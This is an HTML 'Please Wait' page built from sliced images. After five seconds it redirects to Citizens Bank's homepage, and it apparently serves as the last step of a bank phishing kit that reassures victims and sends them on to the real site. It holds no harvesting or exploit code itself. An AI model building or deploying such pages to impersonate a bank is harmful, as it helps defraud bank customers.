<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Please Wait</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<html><meta http-equiv="Refresh" content="05; url=https://www.citizensbank.com/HomePage.aspx"></html>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:144px; top:19px; width:173px; height:30px; z-index:0"><a href="#"><img src="images/z1.png" alt="" title="" border=0 width=173 height=30></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:408px; width:1349px; height:51px; z-index:1"><img src="images/z8.png" alt="" title="" border=0 width=1349 height=51></div>

<div id="image9" style="position:absolute; overflow:hidden; left:266px; top:495px; width:767px; height:233px; z-index:2"><a href="#"><img src="images/z9.png" alt="" title="" border=0 width=767 height=233></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:264px; top:768px; width:756px; height:112px; z-index:3"><a href="#"><img src="images/z10.png" alt="" title="" border=0 width=756 height=112></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:268px; top:930px; width:124px; height:117px; z-index:4"><a href="#"><img src="images/z11.png" alt="" title="" border=0 width=124 height=117></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:143px; top:1060px; width:1074px; height:158px; z-index:5"><img src="images/z12.png" alt="" title="" border=0 width=1074 height=158></div>

<div id="image2" style="position:absolute; overflow:hidden; left:144px; top:50px; width:1067px; height:94px; z-index:6"><img src="images/z22.png" alt="" title="" border=0 width=1067 height=94></div>

<div id="image3" style="position:absolute; overflow:hidden; left:644px; top:252px; width:75px; height:75px; z-index:7"><img src="images/cz.gif" alt="" title="" border=0 width=75 height=75></div>

</div>

</body>
</html>
